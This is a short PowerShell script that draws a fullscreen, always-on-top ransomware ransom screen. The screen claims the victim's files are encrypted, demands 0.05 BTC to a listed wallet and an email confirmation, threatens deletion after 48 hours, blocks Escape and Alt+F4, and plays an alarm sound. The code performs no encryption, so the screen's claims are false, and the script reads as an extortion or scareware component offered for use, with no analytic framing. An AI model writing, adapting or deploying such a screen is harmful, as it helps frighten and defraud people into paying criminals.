Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object Windows.Forms.Form
$form.Text = "Decryptor"
$form.WindowState = "Maximized"
$form.FormBorderStyle = 'None'
$form.TopMost = $true
$form.BackColor = 'Black'

$label = New-Object Windows.Forms.Label
$label.ForeColor = 'Red'
$label.Font = New-Object Drawing.Font("Consolas", 26, [System.Drawing.FontStyle]::Bold)
$label.Dock = 'Top'
$label.TextAlign = 'MiddleCenter'
$label.Height = 80
$label.Text = "!!! YOUR FILES HAVE BEEN ENCRYPTED !!!"
$form.Controls.Add($label)

$details = New-Object Windows.Forms.Label
$details.ForeColor = 'White'
$details.Font = New-Object Drawing.Font("Consolas", 14)
$details.Dock = 'Fill'
$details.TextAlign = 'TopLeft'
$details.Padding = '20,100,20,20'
$details.Text = @"
All your important files including documents, databases, and images are now encrypted.

To recover your files, send 0.05 BTC to the wallet address below:
→ 1FfmbHfnpaZjKFvyi1okTjJJusN455paPH

After payment, send a confirmation email to: decryptor_support@protonmail.com

You have 48 hours to comply or your files will be permanently deleted.

Time Left: 47:59:59

Decryption Key: [Awaiting Payment]
"@
$form.Controls.Add($details)

# Optional: Disable Alt+F4 or ESC
$form.KeyPreview = $true
$form.Add_KeyDown({
    if ($_.KeyCode -eq "Escape" -or $_.Alt -and $_.KeyCode -eq "F4") {
        $_.Handled = $true
    }
})

# Optional: Play scary alert sound
[System.Media.SystemSounds]::Exclamation.Play()

$form.ShowDialog()
